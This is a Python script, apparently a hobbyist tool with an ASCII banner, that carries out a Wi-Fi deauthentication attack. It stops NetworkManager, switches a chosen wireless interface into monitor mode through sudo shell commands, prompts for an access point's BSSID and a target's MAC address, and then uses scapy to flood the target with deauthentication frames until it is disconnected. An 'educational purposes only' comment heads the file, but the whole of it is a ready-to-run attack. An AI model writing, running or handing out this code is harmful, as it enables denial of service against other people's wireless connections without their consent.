#this is just a simple script for educational purposes only
import subprocess
from colorama import Fore,Style
import netifaces
from scapy.all import *

def banner():
  print("""
  ██████╗ ██████╗ ██╗  ██╗██╗   ██╗████████╗██╗  ██╗███████╗██████╗ 
  ██╔══██╗╚════██╗██║  ██║██║   ██║╚══██╔══╝██║  ██║██╔════╝██╔══██╗
  ██║  ██║ █████╔╝███████║██║   ██║   ██║   ███████║█████╗  ██████╔╝
  ██║  ██║ ╚═══██╗╚════██║██║   ██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
  ██████╔╝██████╔╝     ██║╚██████╔╝   ██║   ██║  ██║███████╗██║  ██║
  ╚═════╝ ╚═════╝      ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                    
  Maded by Eneajkl

  Version:1.1

  """)

def get_network_manager_service_name():
    cmd = "systemctl list-units --type=service --all | grep NetworkManager.service"
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, _ = process.communicate()
    output = output.decode().strip()
    service_name = output.split()[0]
    return service_name

networkmanger = str(get_network_manager_service_name())

def monitorModeOn():
  commands=[f"sudo systemctl stop {networkmanger} && sudo ifconfig {interface} down && sudo iwconfig {interface} mode monitor && sudo ifconfig {interface} up"]
  for i in commands:
    subprocess.run(commands,shell=True)

def monitorModeOff():
  commands=[f"sudo systemctl stop {networkmanger} && sudo ifconfig {interface} down && sudo iwconfig {interface} mode managed && sudo ifconfig {interface} up && sudo systemctl restart {networkmanger}"]
  for i in commands:
    subprocess.run(commands,shell=True)

def interface_selecter():
  interfaces=netifaces.interfaces()
  selector=0

  for i in interfaces:
    print("[",selector,"] ",i)
    selector+=1
  
  selected_interface_id=int(input("Interface ID: "))
  return interfaces[selected_interface_id]

print(Fore.LIGHTYELLOW_EX )
banner()
print(Fore.LIGHTRED_EX)

interface=str(interface_selecter())

monitorModeOn()

bssid=str(input("BSSID: "))
targetmac=str(input("Target's MAC address: "))
choose=str(input("Start sending packets (Y/n)"))
if choose == "Y" or choose == "y":
  dot11 = Dot11(addr1=targetmac, addr2=bssid, addr3=bssid)
  packet = RadioTap()/dot11/Dot11Deauth(reason=7)
  sendp(packet, inter=0.1, count=99999999999999, iface=interface, verbose=1)
  monitorModeOff()
elif choose == "n" or choose == "N":
  monitorModeOff()

#subprocess.call(["clear"])
print(Fore.LIGHTYELLOW_EX )
banner()
print(Fore.LIGHTRED_EX)
print("\nSee you later...\nPress any key to exit")
print(Style.RESET_ALL)
input()
